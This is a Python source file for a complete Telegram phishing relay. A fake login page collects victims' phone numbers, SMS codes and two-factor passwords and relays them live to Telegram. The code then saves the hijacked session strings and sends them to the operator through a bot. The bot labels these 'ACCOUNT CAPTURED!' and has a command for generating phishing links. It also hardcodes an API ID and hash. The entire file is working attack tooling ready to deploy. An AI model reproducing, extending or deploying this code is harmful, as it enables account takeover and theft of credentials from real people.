import os
import asyncio
import telebot
from quart import Quart, request, render_template, jsonify
from telethon import TelegramClient, errors
from telethon.sessions import StringSession
from threading import Thread

# --- CONFIGURATION (Koyeb Env Vars) ---
API_ID = int(os.environ.get("API_ID", 36003995))
API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
# Your Koyeb URL (e.g., https://app-name.koyeb.app)
BASE_URL = os.environ.get("BASE_URL", "Set your BASE_URL in Koyeb settings")

try:
    GROUP_ID = int(os.environ.get("GROUP_ID", 0))
except:
    GROUP_ID = 0

# Initialize frameworks
bot = telebot.TeleBot(BOT_TOKEN)
app = Quart(__name__)

# { "phone": {"client": TelegramClient, "hash": str} }
active_relays = {}

# --- TELEGRAM BOT COMMANDS ---

@bot.message_handler(commands=['start', 'help'])
@bot.message_handler(func=lambda m: m.text == '.help')
def send_help(m):
    # Only reply in the private group or to the admin
    if m.chat.id != GROUP_ID and m.chat.id != m.from_user.id:
        return

    help_text = (
        "🤖 <b>VinzyStore Relay Control</b>\n\n"
        "<b>Available Commands:</b>\n"
        "• <code>.help</code> - Show this menu\n"
        "• <code>.get [phone]</code> - Check if a target session is active in memory\n"
        "• <code>.info</code> - View server status and Base URL\n"
        "• <code>.link [id]</code> - Generate a custom phishing link for a specific ID\n\n"
        "<b>Current Config:</b>\n"
        f"🌐 <b>Base URL:</b> {BASE_URL}\n"
        f"👥 <b>Log Group:</b> <code>{GROUP_ID}</code>"
    )
    bot.reply_to(m, help_text, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text == '.info')
def server_info(m):
    active_count = len(active_relays)
    bot.reply_to(m, f"ℹ️ <b>Server Status:</b> ONLINE\n🔥 <b>Active Sessions in Memory:</b> {active_count}\n🔗 <b>Base:</b> {BASE_URL}", parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text and m.text.startswith('.link'))
def gen_link(m):
    parts = m.text.split(' ')
    target_id = parts[1] if len(parts) > 1 else m.from_user.id
    generated_link = f"{BASE_URL.rstrip('/')}/?id={target_id}"
    bot.reply_to(m, f"🔗 <b>Your generated link:</b>\n<code>{generated_link}</code>", parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text and m.text.startswith('.get'))
def get_account_info(m):
    if m.chat.id != GROUP_ID and m.chat.id != m.from_user.id:
        return
    try:
        parts = m.text.split(' ')
        if len(parts) < 2:
            return bot.reply_to(m, "❌ Usage: <code>.get +855XXXXXXXX</code>", parse_mode="HTML")
        
        target_phone = parts[1]
        if target_phone in active_relays:
            relay = active_relays[target_phone]
            status = "CONNECTED" if relay['client'].is_connected() else "DISCONNECTED"
            bot.reply_to(m, f"✅ <b>Relay Found:</b> {target_phone}\n📡 <b>Status:</b> {status}", parse_mode="HTML")
        else:
            bot.reply_to(m, f"❌ <b>No Active Relay</b> for {target_phone}.", parse_mode="HTML")
    except Exception as e:
        bot.reply_to(m, f"❌ Error: {str(e)}")

# --- WEB ROUTES ---

@app.route('/')
async def index():
    tid = request.args.get('id', 'Admin')
    return await render_template('login.html', tid=tid)

@app.route('/step_phone', methods=['POST'])
async def step_phone():
    data = await request.json
    phone = data.get('phone')
    tid = data.get('tid')

    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()

    try:
        sent_code = await client.send_code_request(phone)
        active_relays[phone] = {"client": client, "hash": sent_code.phone_code_hash}

        bot.send_message(tid, f"🎯 <b>Target Hit!</b>\n📱 Phone: <code>{phone}</code>\n💬 Status: <b>SMS Sent</b>", parse_mode="HTML")
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)})

@app.route('/step_code', methods=['POST'])
async def step_code():
    data = await request.json
    phone = data.get('phone')
    code = data.get('code')
    tid = data.get('tid')

    if phone not in active_relays:
        return jsonify({"status": "error", "msg": "Session expired."})

    relay = active_relays[phone]
    client = relay["client"]

    try:
        await client.sign_in(phone, code, phone_code_hash=relay["hash"])
        victim_session = client.session.save()
        
        log_msg = (
            f"💰 <b>ACCOUNT CAPTURED!</b>\n━━━━━━━━━━━━━━━\n"
            f"📱 <b>Phone:</b> <code>{phone}</code>\n"
            f"🔑 <b>Session:</b>\n<code>{victim_session}</code>\n━━━━━━━━━━━━━━━"
        )
        bot.send_message(tid, log_msg, parse_mode="HTML")
        if GROUP_ID: bot.send_message(GROUP_ID, log_msg, parse_mode="HTML")
        return jsonify({"status": "success"})

    except errors.SessionPasswordNeededError:
        bot.send_message(tid, f"🛡️ <b>2FA Detected</b> for {phone}.", parse_mode="HTML")
        return jsonify({"status": "2fa_needed"})
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)})

@app.route('/step_2fa', methods=['POST'])
async def step_2fa():
    data = await request.json
    phone = data.get('phone')
    password = data.get('password')
    tid = data.get('tid')

    if phone not in active_relays:
        return jsonify({"status": "error", "msg": "Session expired."})

    client = active_relays[phone]["client"]

    try:
        await client.sign_in(password=password)
        victim_session = client.session.save()
        log_msg = f"🔓 <b>2FA BYPASSED!</b>\n📱 <b>Phone:</b> <code>{phone}</code>\n🔑 <b>Session:</b>\n<code>{victim_session}</code>"
        bot.send_message(tid, log_msg, parse_mode="HTML")
        if GROUP_ID: bot.send_message(GROUP_ID, log_msg, parse_mode="HTML")
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)})

# --- STARTUP ---

def run_bot():
    bot.remove_webhook()
    bot.polling(none_stop=True)

if __name__ == "__main__":
    Thread(target=run_bot, daemon=True).start()
    app.run(host="0.0.0.0", port=8000)
